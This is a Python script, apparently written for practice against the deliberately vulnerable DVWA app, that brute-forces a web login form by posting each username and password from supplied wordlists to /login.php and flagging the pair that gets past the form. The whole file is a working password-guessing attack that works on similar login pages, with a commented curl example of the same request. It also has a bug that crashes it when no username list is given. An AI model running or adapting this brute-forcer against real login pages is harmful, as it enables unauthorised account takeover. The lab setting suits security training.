#!/usr/bin/python3

import requests
from bs4 import BeautifulSoup
import argparse
from urllib.parse import urlparse

class bcolors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'

class Login():

    def __init__(self):
        self.initializeVariables()
        self.sendrequest()

    def initializeVariables(self):
        #Initialize args
        parser = argparse.ArgumentParser(description='dvwa login bruteforce')
        #required
        parser.add_argument('-u', '--url', required=True, type=str, help='dvwa url')
        parser.add_argument('-w', '--wordlist', required=True, type=str, help='Path to wordlist file')
        parser.add_argument('-U', '--userlist', type=str, help='Username list')
        
        args = parser.parse_args()

        self.url = args.url
        self.login='Login'
        #Need cookie
        self.cookies = requests.session().get(self.url+'/login.php').cookies.get_dict()
        #Wordlist from args
        self.wordlistfile = args.wordlist
        self.userlist = args.userlist
    # curl -s -L -b cookie -d "username=admin&password=password&Login=Login" http://172.16.16.129/dvwa/login.php | grep Welcome

    def sendrequest(self):
        if self.userlist:
            for user in self.getdata(self.userlist):
                self.username=user.decode('utf-8')
                self.found=False
                self.doGET()
                if self.found:
                    break
        else:
            self.doGET()

    def doGET(self):
        for password in self.getdata(self.wordlistfile):
            #Custom user-agent :)
            headers = {
                'User-Agent': 'nano'
            }

            #First GET for CSSRF
            # r = requests.get(self.url, cookies=self.cookies, headers=headers)
            # soup = BeautifulSoup(r.text, 'html.parser')
            # longstring = (soup.find_all('input', type='hidden')[-1]).get('name')
            # password=password.decode('utf-8')
            self.password=password.decode('utf-8')

            data = {
                'username' : self.username,
                'password' : self.password,
                'Login' : self.login,
            }
            r = requests.post(self.url+'/login.php', data = data, cookies=self.cookies, headers=headers)
            # r = requests.post(self.url+'/login.php', data = data, cookies=self.cookies, headers=headers)
            # print(r.text)
            # exit()
            soup = BeautifulSoup(r.text, 'html.parser')
            # print (soup)
            response = soup.find('form', {'action': 'login.php'})
            # print (response)
            if response:
                print(f'{bcolors.FAIL} {self.username}:{self.password}{bcolors.ENDC}')
            else:
                print(f'{bcolors.OKGREEN} {self.username}:{self.password}{bcolors.ENDC}')
                self.found=True
                break

    @staticmethod
    def getdata(path):
        with open(path, 'rb+') as f:
            data = ([line.rstrip() for line in f])
            f.close()
        return data


login = Login()
